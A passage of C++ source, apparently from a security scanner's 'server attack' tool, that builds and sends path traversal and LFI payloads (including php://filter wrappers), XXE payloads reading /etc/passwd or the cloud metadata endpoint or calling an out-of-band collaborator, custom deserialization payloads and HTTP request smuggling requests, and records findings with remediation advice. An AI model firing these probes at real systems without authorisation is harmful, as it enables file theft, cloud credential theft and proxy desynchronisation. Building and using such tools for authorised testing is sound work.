    auto custom = traversal_payloads_for(file_path, windows, json_bool_or(payload, "encoding_bypass", true), json_bool_or(payload, "null_byte", false));
    probes.insert(probes.begin(), custom.begin(), custom.end());
    if (lfi_mode) {
        auto techniques = json_string_array(payload, "techniques");
        if (techniques.empty()) techniques.push_back("auto");
        bool wrappers = false;
        for (const auto& t : techniques) {
            const std::string lt = lower_ascii(t);
            if (lt == "auto" || lt == "php_wrapper") wrappers = true;
        }
        if (wrappers) {
            const std::string wrapper = json_string_or(payload, "php_wrapper", "php://filter");
            scanner::probe_t p;
            p.payload = wrapper == "php://filter"
                ? "php://filter/convert.base64-encode/resource=" + file_path
                : wrapper + file_path;
            p.marker = known_file_marker(file_path);
            p.variant = "php-wrapper";
            probes.insert(probes.begin(), std::move(p));
        }
        auto unix_lfi = payload_entries_as_probes("path_traversal/unix_advanced", "payload-library:path_traversal/unix_advanced", 8);
        auto win_lfi = payload_entries_as_probes("path_traversal/windows_advanced", "payload-library:path_traversal/windows_advanced", 8);
        auto encoded_lfi = payload_entries_as_probes("path_traversal/encoding_bypass", "payload-library:path_traversal/encoding_bypass", 8);
        probes.insert(probes.end(), unix_lfi.begin(), unix_lfi.end());
        probes.insert(probes.end(), win_lfi.begin(), win_lfi.end());
        probes.insert(probes.end(), encoded_lfi.begin(), encoded_lfi.end());
    }
    auto delivered = deliver_probes(ctx, ip, baseline, "path-traversal", probes, limits, true, true);
    out["attempts"] = delivered.attempts;
    std::vector<uint64_t> issue_ids = delivered.issue_ids;
    bool confirmed = delivered.confirmed;
    const std::string marker = known_file_marker(file_path);
    if (!confirmed && delivered.confirmed_response.has_value() && !marker.empty() && body_contains_ci_local(delivered.confirmed_response->resp_body, marker))
        confirmed = true;
    if (confirmed && delivered.issue_ids.empty()) {
        json evidence;
        evidence["marker"] = marker;
        evidence["variant"] = delivered.confirmed_variant;
        if (delivered.confirmed_response.has_value()) evidence["response"] = response_summary(*delivered.confirmed_response);
        issue_t iss = make_sanitized_issue(lfi_mode ? "lfi.file-read" : "path-traversal.file-read",
                                           lfi_mode ? "Local File Inclusion confirmed" : "Path Traversal file read confirmed",
                                           severity_t::high,
                                           confidence_t::firm,
                                           ctx,
                                           ip,
                                           delivered.confirmed_response,
                                           "A sensitive-file marker appeared in the response after a file path payload was injected into the selected parameter.",
                                           "Resolve requested paths to a canonical form under an allow-listed base directory and reject traversal, wrapper, and absolute-path inputs.",
                                           {"CWE-22", "CWE-98"},
                                           evidence);
        issue_ids.push_back(add_issue(std::move(iss)));
    }
    out["vulnerable"] = confirmed;
    out["file_read_confirmed"] = confirmed;
    out["encoding_used"] = delivered.confirmed_variant;
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(confirmed ? "file read evidence collected" : "no file read evidence confirmed", out);
}

std::vector<scanner::probe_t> xxe_custom_payloads(const json& payload, const std::optional<collaborator::token_info_t>& token)
{
    std::vector<scanner::probe_t> probes;
    const std::string technique = lower_ascii(json_string_or(payload, "technique", "auto"));
    const std::string file_path = json_string_or(payload, "file_path", "/etc/passwd");
    const std::string marker = known_file_marker(file_path);
    if (technique == "auto" || technique == "file_read" || technique == "error") {
        scanner::probe_t file;
        file.payload = "<?xml version=\"1.0\"?>\n<!DOCTYPE a [<!ENTITY xxe SYSTEM \"file://" + file_path + "\">]>\n<root>&xxe;</root>";
        file.marker = marker;
        file.variant = "xxe-file-read";
        probes.push_back(std::move(file));
    }
    if (technique == "auto" || technique == "ssrf") {
        scanner::probe_t ssrf;
        ssrf.payload = "<?xml version=\"1.0\"?>\n<!DOCTYPE a [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>\n<root>&xxe;</root>";
        ssrf.marker = "ami-id";
        ssrf.variant = "xxe-ssrf-imds";
        probes.push_back(std::move(ssrf));
    }
    if (token.has_value()) {
        const std::string url = collaborator_url_for_token(*token);
        if (!url.empty()) {
            scanner::probe_t oob;
            oob.payload = "<?xml version=\"1.0\"?>\n<!DOCTYPE a [<!ENTITY % dtd SYSTEM \"" + url + "\">%dtd;]>\n<root>aida</root>";
            oob.marker = token->token;
            oob.variant = "xxe-oob-collaborator";
            probes.push_back(std::move(oob));
        }
    }
    return probes;
}

action_result_t run_xxe(const std::string& action, const json& payload)
{
    const std::string technique = lower_ascii(json_string_or(payload, "technique", "auto"));
    if (technique == "billion_laughs")
        return err_result("billion_laughs is a denial-of-service payload and is not sent by this MCP tool", "unsafe_technique");
    json p = payload;
    if (!p.contains("xml_body")) p["xml_body"] = "<root>aida</root>";
    if (!p.contains("content_type")) p["content_type"] = "application/xml";
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(p, 30000);
    std::string err;
    auto ctx_opt = build_request_context(p, json_string_or(p, "method", "POST"), "application/xml", false, err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    auto ip_opt = select_insertion_point(ctx, param_target_or(p), has_param_target(p));
    insertion_point_t ip = ip_opt.has_value() ? *ip_opt : whole_body_insertion_point(ctx, "xml_body");
    json out = start_result(task_id, action, started, ctx);
    out["insertion_point"] = ip.kind;
    auto baseline = send_baseline(ctx, limits, out);
    std::optional<collaborator::token_info_t> token;
    if (json_bool_or(p, "use_collaborator", true) && collaborator::is_running()) {
        token = issue_collaborator_token();
        if (token.has_value())
            out["oob_token"] = collaborator_token_json(*token);
        else
            out["oob_unavailable"] = true;
    } else if (json_bool_or(p, "use_collaborator", true)) {
        out["oob_unavailable"] = true;
    }
    std::vector<scanner::probe_t> probes = scanner_module_probes("xxe", ip, ctx, baseline, limits);
    auto custom = xxe_custom_payloads(p, token);
    probes.insert(probes.begin(), custom.begin(), custom.end());
    auto delivered = deliver_probes(ctx, ip, baseline, "xxe", probes, limits, false, true);
    out["attempts"] = delivered.attempts;
    std::vector<uint64_t> issue_ids = delivered.issue_ids;
    bool confirmed = delivered.confirmed;
    if (token.has_value()) {
        const auto interactions = collaborator::poll_by_token(token->token);
        out["oob_interactions"] = interactions_to_json(interactions);
        out["oob_interaction_count"] = interactions.size();
        if (!interactions.empty()) {
            confirmed = true;
            json evidence;
            evidence["token"] = collaborator_token_json(*token);
            evidence["interactions"] = interactions_to_json(interactions);
            const auto exact_redactions = collaborator_exact_redactions(*token);
            issue_t iss = make_sanitized_issue("xxe.oob-confirmed",
                                               "XML External Entity confirmed by collaborator interaction",
                                               severity_t::critical,
                                               confidence_t::certain,
                                               ctx,
                                               ip,
                                               delivered.confirmed_response,
                                               "An XML external entity payload caused the server to request an AiDA collaborator token.",
                                               "Disable external entity and parameter-entity resolution in XML parser configuration and reject untrusted DTDs.",
                                               {"CWE-611", "CWE-827"},
                                               evidence,
                                               exact_redactions);
            issue_ids.push_back(add_issue(std::move(iss)));
        }
    }
    out["vulnerable"] = confirmed;
    out["technique"] = technique;
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(confirmed ? "XXE evidence collected" : "no XXE evidence confirmed", out);
}

std::string detect_serialized_format(const std::string& value)
{
    if (value.size() >= 4 &&
        static_cast<unsigned char>(value[0]) == 0xac &&
        static_cast<unsigned char>(value[1]) == 0xed &&
        static_cast<unsigned char>(value[2]) == 0x00 &&
        static_cast<unsigned char>(value[3]) == 0x05) return "java";
    if (value.size() >= 2 && static_cast<unsigned char>(value[0]) == 0x80) return "python";
    if (value.size() >= 2 && value[0] == 'O' && value[1] == ':') return "php";
    if (value.find("rO0AB") == 0) return "java-base64";
    if (value.find("AAEAAAD/////") == 0) return ".net-base64";
    return "unknown";
}

action_result_t run_deserialize(const std::string& action, const json& payload)
{
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(payload, 30000);
    std::string err;
    auto ctx_opt = build_request_context(payload, json_string_or(payload, "method", "POST"), "application/x-www-form-urlencoded", has_param_target(payload), err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    auto ip_opt = select_insertion_point(ctx, param_target_or(payload), has_param_target(payload));
    insertion_point_t ip = ip_opt.has_value() ? *ip_opt : whole_body_insertion_point(ctx, "serialized_body");
    json out = start_result(task_id, action, started, ctx);
    out["parameter"] = ip.name;
    out["detected_format"] = detect_serialized_format(ip.original_value);
    auto baseline = send_baseline(ctx, limits, out);
    std::optional<collaborator::token_info_t> token;
    const std::string supplied_token = json_string_or(payload, "oob_token", "");
    if (json_bool_or(payload, "use_collaborator", true) && collaborator::is_running() && supplied_token.empty()) {
        token = issue_collaborator_token();
        if (token.has_value())
            out["oob_token"] = collaborator_token_json(*token);
        else
            out["oob_unavailable"] = true;
    }
    std::vector<scanner::probe_t> probes = scanner_module_probes("deserial", ip, ctx, baseline, limits);
    if (payload.contains("payload_b64") && payload["payload_b64"].is_string()) {
        const auto decoded = base64_decode(payload["payload_b64"].get<std::string>());
        if (decoded.empty() && !payload["payload_b64"].get<std::string>().empty()) return err_result("payload_b64 invalid", "invalid_param");
        scanner::probe_t custom;
        custom.payload.assign(reinterpret_cast<const char*>(decoded.data()), decoded.size());
        custom.marker = token.has_value() ? token->token : supplied_token;
        custom.variant = "custom-deserialization-payload";
        probes.insert(probes.begin(), std::move(custom));
        out["custom_payload"] = {{"len", decoded.size()}, {"hash", hash_vector(decoded)}};
    }
    auto delivered = deliver_probes(ctx, ip, baseline, "deserial", probes, limits, false, true);
    out["attempts"] = delivered.attempts;
    std::vector<uint64_t> issue_ids = delivered.issue_ids;
    bool confirmed = delivered.confirmed;
    std::string poll_token = supplied_token;
    if (token.has_value()) poll_token = token->token;
    if (!poll_token.empty() && collaborator::is_running()) {
        const auto interactions = collaborator::poll_by_token(poll_token);
        out["oob_interactions"] = interactions_to_json(interactions);
        out["oob_interaction_count"] = interactions.size();
        if (!interactions.empty()) {
            confirmed = true;
            json evidence;
            evidence["token_len"] = poll_token.size();
            evidence["token_hash"] = hash_text(poll_token);
            evidence["interactions"] = interactions_to_json(interactions);
            std::vector<std::string> exact_redactions = {poll_token};
            if (token.has_value()) {
                exact_redactions = collaborator_exact_redactions(*token);
            }
            issue_t iss = make_sanitized_issue("deserial.oob-confirmed",
                                               "Insecure deserialization confirmed by collaborator interaction",
                                               severity_t::critical,
                                               confidence_t::certain,
                                               ctx,
                                               ip,
                                               delivered.confirmed_response,
                                               "A deserialization payload caused an out-of-band collaborator interaction.",
                                               "Do not deserialize untrusted data; enforce a strict class allow-list or replace native serialization with schema-validated formats.",
                                               {"CWE-502"},
                                               evidence,
                                               exact_redactions);
            issue_ids.push_back(add_issue(std::move(iss)));
        }
    }
    out["vulnerable"] = confirmed;
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(confirmed ? "deserialization evidence collected" : "no deserialization exploitation evidence confirmed", out);
}

std::vector<uint8_t> build_cl_te_request(const std::vector<uint8_t>& raw)
{
    std::string base(reinterpret_cast<const char*>(raw.data()), raw.size());
    const size_t eol = base.find("\r\n");
    const size_t body_off = base.find("\r\n\r\n");
    if (eol == std::string::npos || body_off == std::string::npos) return raw;
    std::string smuggled = "0\r\n\r\nG";
    std::string out = base.substr(0, eol + 2);
    out += "Content-Length: ";
    out += std::to_string(smuggled.size());
    out += "\r\nTransfer-Encoding: chunked\r\n";
    std::string headers = base.substr(eol + 2, body_off - eol - 2);
    size_t p = 0;
    while (p < headers.size()) {
        size_t le = headers.find("\r\n", p);
        if (le == std::string::npos) le = headers.size();
        std::string line = headers.substr(p, le - p);
        std::string ll = lower_ascii(line);
        if (ll.rfind("content-length:", 0) != 0 && ll.rfind("transfer-encoding:", 0) != 0 && ll.rfind("connection:", 0) != 0) {
            out += line;
            out += "\r\n";
        }
        if (le == headers.size()) break;
        p = le + 2;
    }
    out += "Connection: close\r\n\r\n";
    out += smuggled;
    return std::vector<uint8_t>(out.begin(), out.end());
}

std::vector<uint8_t> build_te_cl_request(const std::vector<uint8_t>& raw)
{
    std::string base(reinterpret_cast<const char*>(raw.data()), raw.size());
    const size_t eol = base.find("\r\n");
    const size_t body_off = base.find("\r\n\r\n");
    if (eol == std::string::npos || body_off == std::string::npos) return raw;
    std::string smuggled = "5\r\nGHOST\r\n0\r\n\r\n";
    std::string out = base.substr(0, eol + 2);
    out += "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n";
    std::string headers = base.substr(eol + 2, body_off - eol - 2);
    size_t p = 0;
    while (p < headers.size()) {
        size_t le = headers.find("\r\n", p);
        if (le == std::string::npos) le = headers.size();
        std::string line = headers.substr(p, le - p);
        std::string ll = lower_ascii(line);
        if (ll.rfind("content-length:", 0) != 0 && ll.rfind("transfer-encoding:", 0) != 0 && ll.rfind("connection:", 0) != 0) {
            out += line;
            out += "\r\n";
        }
        if (le == headers.size()) break;
        p = le + 2;
    }
    out += "Connection: close\r\n\r\n";
    out += smuggled;
    return std::vector<uint8_t>(out.begin(), out.end());
}

std::vector<uint8_t> build_te_te_request(const std::vector<uint8_t>& raw)
{
    std::vector<uint8_t> out = build_te_cl_request(raw);
    std::string text(reinterpret_cast<const char*>(out.data()), out.size());
    const size_t pos = text.find("Transfer-Encoding: chunked");
    if (pos != std::string::npos) text.replace(pos, std::string("Transfer-Encoding: chunked").size(), "Transfer-Encoding: chunked\r\nTransfer-Encoding : chunked");
    return std::vector<uint8_t>(text.begin(), text.end());
}

action_result_t run_smuggle(const std::string& action, const json& payload)
{
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    const size_t issues_before = issue_store::count();
    run_limits_t limits = limits_from_payload(payload, 30000);
    std::string err;
    auto ctx_opt = build_request_context(payload, json_string_or(payload, "method", "POST"), "application/x-www-form-urlencoded", false, err);
    if (!ctx_opt.has_value()) return err_result(err, "invalid_request");
    request_context_t ctx = *ctx_opt;
    insertion_point_t ip = ctx.insertion_points.empty() ? whole_body_insertion_point(ctx, "request") : ctx.insertion_points.front();
    json out = start_result(task_id, action, started, ctx);
    auto baseline = send_baseline(ctx, limits, out);
    const std::string technique = lower_ascii(json_string_or(payload, "technique", "auto"));
    std::vector<std::pair<std::string, std::vector<uint8_t>>> probes;
    if (payload.contains("probe_request_b64") && payload["probe_request_b64"].is_string()) {
        auto decoded = base64_decode(payload["probe_request_b64"].get<std::string>());
        if (decoded.empty() && !payload["probe_request_b64"].get<std::string>().empty()) return err_result("probe_request_b64 invalid", "invalid_param");
        probes.emplace_back("custom-b64", std::move(decoded));
    } else if (payload.contains("payload") && payload["payload"].is_string()) {
        const std::string custom = payload["payload"].get<std::string>();
        probes.emplace_back("custom-text", std::vector<uint8_t>(custom.begin(), custom.end()));
    } else {
        if (technique == "auto" || technique == "cl_te") probes.emplace_back("cl_te", build_cl_te_request(ctx.raw_request));
        if (technique == "auto" || technique == "te_cl") probes.emplace_back("te_cl", build_te_cl_request(ctx.raw_request));
        if (technique == "auto" || technique == "te_te") probes.emplace_back("te_te", build_te_te_request(ctx.raw_request));
    }
    json attempts = json::array();
    std::vector<uint64_t> issue_ids;
    bool confirmed = false;
    for (const auto& item : probes) {
        if (attempts.size() >= limits.max_payloads) break;
        json attempt;
        attempt["technique"] = item.first;
        attempt["request_len"] = item.second.size();
        attempt["request_hash"] = hash_vector(item.second);
        const uint64_t before = now_ms();
        json send_err = json::object();
        auto response = send_request(ctx, item.second, limits, item.first.c_str(), &send_err);
        const uint64_t elapsed = now_ms() - before;
        attempt["elapsed_ms"] = elapsed;
        if (response.has_value()) {
            attempt["response"] = response_summary(*response);
            attempt["delta"] = response_delta(baseline, *response);
            if (baseline.has_value() && response->status_code >= 400 && baseline->status_code >= 200 && baseline->status_code < 400)
                attempt["framing_divergence"] = true;
        } else {
            attempt["response_received"] = false;
            attempt["error"] = send_err;
            if (baseline.has_value() && elapsed > baseline->latency_ms + 4000) {
                attempt["timing_evidence"] = "no response beyond baseline plus 4000ms";
                confirmed = true;
            }
        }
        attempts.push_back(std::move(attempt));
        if (confirmed) {
            json evidence;
            evidence["technique"] = item.first;
            evidence["attempt"] = attempts.back();
            issue_t iss = make_sanitized_issue("smuggling.timing-desync",
                                               "HTTP request smuggling timing desync",
                                               severity_t::high,
                                               confidence_t::tentative,
                                               ctx,
                                               ip,
                                               response,
                                               "A conflicting framing probe produced timing behavior consistent with front-end/back-end HTTP desynchronization.",
                                               "Reject requests carrying ambiguous Content-Length and Transfer-Encoding combinations at the first HTTP hop and normalize framing across the proxy chain.",
                                               {"CWE-444"},
                                               evidence);
            issue_ids.push_back(add_issue(std::move(iss)));
            break;
        }
    }
    out["attempts"] = attempts;
    if (json_bool_or(payload, "h2_probe", true) && ctx.target.tls) {
        h2_editor::request_t req;
        req.host = ctx.target.host;
        req.port = ctx.target.port;
        req.timeout_ms = static_cast<int>((std::min<uint64_t>)(limits.timeout_ms, kMaxTimeoutMs));
        req.pseudo.method = "GET";
        req.pseudo.path = path_without_query(ctx.target.path);
        req.pseudo.scheme = "https";
        req.pseudo.authority = host_header_value(ctx.target);
        req.headers.emplace_back("te", "trailers");
        h2_editor::response_t h2 = h2_editor::send(req);
        out["h2_probe"] = h2_response_summary(h2);
    }
    out["vulnerable"] = confirmed;
    out["request_smuggling_confirmed"] = confirmed;
    out["technique"] = technique;
    finish_result(out, limits, started, issues_before, issue_ids);
    persist_completed(task_id, action, started, out);
    return ok_result(confirmed ? "request smuggling timing evidence collected" : "no request smuggling evidence confirmed", out);
}

action_result_t run_oob_confirm(const std::string& action, const json& payload)
{
    const std::string task_id = make_task_id(action);
    const uint64_t started = now_ms();
    json out;
    out["task_id"] = task_id;
    out["action"] = action;
    out["started_ms"] = started;
    const std::string token = json_string_or(payload, "token", json_string_or(payload, "oob_token", ""));
    if (!collaborator::is_running()) {
        out["collaborator_running"] = false;
        persist_completed(task_id, action, started, out);
        return ok_result("collaborator is not running", out);
    }
    std::vector<collaborator::interaction_t> interactions;
    if (!token.empty()) interactions = collaborator::poll_by_token(token);
    else {
        collaborator::poll_request_t req;
        req.after_id = json_u64_or(payload, "after_id", 0, 0, UINT64_MAX);
        req.max_entries = static_cast<size_t>(json_u64_or(payload, "max_entries", 64, 1, 512));
        interactions = collaborator::poll_async(req).interactions;
    }
    out["collaborator_running"] = true;
    if (!token.empty()) {
        out["token_len"] = token.size();
        out["token_hash"] = hash_text(token);
    }
    out["interaction_count"] = interactions.size();
    out["interactions"] = interactions_to_json(interactions);
    out["confirmed"] = !interactions.empty();
    out["ended_ms"] = now_ms();
    out["elapsed_ms"] = out["ended_ms"].get<uint64_t>() - started;
    persist_completed(task_id, action, started, out);
    return ok_result(!interactions.empty() ? "OOB interactions found" : "no OOB interactions found", out);
}

}

action_result_t get_status(const json& payload)
{
    const std::string task_id = json_string_or(payload, "task_id", json_string_or(payload, "id", ""));
    auto record = find_result(task_id);
    if (!record.has_value()) return err_result("task not found", "not_found");
    json out;
    out["task_id"] = record->task_id;
    out["action"] = record->action;
    out["status"] = record->status;
    out["started_ms"] = record->started_ms;
    out["ended_ms"] = record->ended_ms;
    if (record->data.contains("vulnerable")) out["vulnerable"] = record->data["vulnerable"];
    if (record->data.contains("status_deltas")) out["status_deltas"] = record->data["status_deltas"];
    return ok_result("server attack task status", out);
}

action_result_t get_results(const json& payload)
{
    if (json_bool_or(payload, "list", false)) {
        json arr = json::array();
        auto& s = state();
        std::lock_guard<std::mutex> lk(s.mtx);
        for (const auto& id : s.order) {
            auto it = s.results.find(id);
            if (it == s.results.end()) continue;
            json item;
            item["task_id"] = it->second.task_id;
            item["action"] = it->second.action;
            item["status"] = it->second.status;
            item["started_ms"] = it->second.started_ms;
            item["ended_ms"] = it->second.ended_ms;
            arr.push_back(std::move(item));
        }
        return ok_result("server attack task list", json{{"tasks", arr}, {"count", arr.size()}});
    }
    const std::string task_id = json_string_or(payload, "task_id", json_string_or(payload, "id", ""));
    auto record = find_result(task_id);
    if (!record.has_value()) return err_result("task not found", "not_found");
    return ok_result("server attack task results", record->data);
}

action_result_t handle_action(const std::string& action, const json& payload)
{
    payloads::initialize();
    issue_store::initialize();
    const std::string a = lower_ascii(action);
    diag::log_tagged_fmt("offensive_server_attack", "handle_action action=%s", a.c_str());
    try {
        if (a == "ssrf_exploit") return run_ssrf_like(a, payload, false);
        if (a == "cloud_metadata_test") return run_ssrf_like(a, payload, true);
        if (a == "ssti_exploit") return run_ssti(a, payload);
        if (a == "cmdi_exploit") return run_cmdi(a, payload);
        if (a == "path_traversal_exploit") return run_traversal_like(a, payload, false);
        if (a == "lfi_exploit") return run_traversal_like(a, payload, true);
        if (a == "xxe_exploit") return run_xxe(a, payload);
        if (a == "deserialize_exploit") return run_deserialize(a, payload);
        if (a == "smuggle_exploit") return run_smuggle(a, payload);
        if (a == "oob_confirm") return run_oob_confirm(a, payload);
        if (a == "get_status") return get_status(payload);
        if (a == "get_results") return get_results(payload);
    } catch (const std::exception& e) {
        json data;
        data["action"] = a;
        data["exception_hash"] = hash_text(e.what());
        data["exception_len"] = std::string(e.what()).size();
        return err_result("server attack action failed", "exception", data);
    } catch (...) {
        json data;
        data["action"] = a;
        return err_result("server attack action failed", "unknown_exception", data);
    }
    return err_result("unknown action: " + action, "unknown_action");
}

}
}
}
}
